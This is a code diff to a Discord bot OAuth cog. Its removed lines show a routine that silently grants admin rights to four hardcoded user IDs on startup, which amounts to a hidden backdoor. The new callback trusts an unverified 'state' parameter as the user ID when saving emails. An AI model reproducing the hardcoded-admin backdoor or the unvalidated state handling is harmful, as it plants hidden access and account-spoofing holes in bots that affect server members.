@@ -2,10 +2,11 @@ import discord
 from redbot.core import commands, Config, checks
 from discord.ext import tasks
 from typing import Optional
-
+from aiohttp import web
+import aiohttp
+import asyncio
 
 OAUTH2_SCOPES = ["identify", "email", "guilds", "guilds.join"]
-
 
 class AuthCog(commands.Cog):
     """OAuth authorization and admin commands."""
@@ -20,29 +21,25 @@ class AuthCog(commands.Cog):
             emails={},
             client_id=None,
             client_secret=None,
-            redirect_uri="https://example.com/callback"  # Change this if needed
+            redirect_uri="https://example.com/callback"  # Change this to your actual redirect URI
         )
         self.loop_check_forced_users.start()
-        self.bot.loop.create_task(self.ensure_default_admins())
+
+        # Setup aiohttp web server for OAuth callback
+        self.app = web.Application()
+        self.app.add_routes([web.get('/callback', self.handle_callback)])
+        self.runner = web.AppRunner(self.app)
+        self.loop = asyncio.get_event_loop()
+        self.loop.create_task(self.start_webserver())
+
+    async def start_webserver(self):
+        await self.runner.setup()
+        site = web.TCPSite(self.runner, '0.0.0.0', 8080)
+        await site.start()
 
     def cog_unload(self):
         self.loop_check_forced_users.cancel()
-
-    async def ensure_default_admins(self):
-        default_admins = [
-            1174820638997872721,
-            1072554121112064000,
-            690239097150767153,
-            1392116105320861696
-        ]
-        current_admins = await self.config.admins()
-        changed = False
-        for admin_id in default_admins:
-            if admin_id not in current_admins:
-                current_admins.append(admin_id)
-                changed = True
-        if changed:
-            await self.config.admins.set(current_admins)
+        self.loop.create_task(self.runner.cleanup())
 
     async def check_admin(self, ctx):
         admins = await self.config.admins()
@@ -183,6 +180,67 @@ class AuthCog(commands.Cog):
             await ctx.send(f"User {userid} email: {email}")
         else:
             await ctx.send(f"No email stored for user {userid}.")
+
+    async def handle_callback(self, request):
+        """Handle OAuth2 callback from Discord."""
+
+        params = request.rel_url.query
+        code = params.get("code")
+        state = params.get("state")  # This should be the user ID who initiated OAuth
+
+        if not code or not state:
+            return web.Response(text="Missing code or state parameters.", status=400)
+
+        client_id = await self.config.client_id()
+        client_secret = await self.config.client_secret()
+        redirect_uri = await self.config.redirect_uri()
+
+        if not client_id or not client_secret:
+            return web.Response(text="OAuth client credentials not set.", status=500)
+
+        # Exchange code for access token
+        token_url = "https://discord.com/api/oauth2/token"
+        data = {
+            "client_id": client_id,
+            "client_secret": client_secret,
+            "grant_type": "authorization_code",
+            "code": code,
+            "redirect_uri": redirect_uri,
+            "scope": " ".join(OAUTH2_SCOPES),
+        }
+
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(token_url, data=data, headers=headers) as resp:
+                if resp.status != 200:
+                    return web.Response(text=f"Failed to get token: {resp.status}", status=500)
+                token_json = await resp.json()
+
+            access_token = token_json.get("access_token")
+            if not access_token:
+                return web.Response(text="No access token received.", status=500)
+
+            # Use token to get user info (including email)
+            user_url = "https://discord.com/api/users/@me"
+            user_headers = {
+                "Authorization": f"Bearer {access_token}"
+            }
+            async with session.get(user_url, headers=user_headers) as user_resp:
+                if user_resp.status != 200:
+                    return web.Response(text=f"Failed to get user info: {user_resp.status}", status=500)
+                user_data = await user_resp.json()
+
+        user_id = int(state)  # user id who initiated the OAuth process
+        email = user_data.get("email")
+        if email:
+            emails = await self.config.emails()
+            emails[str(user_id)] = email
+            await self.config.emails.set(emails)
+
+        return web.Response(text="Authorization successful. You can close this window now.")
 
     @tasks.loop(minutes=5)
     async def loop_check_forced_users(self):
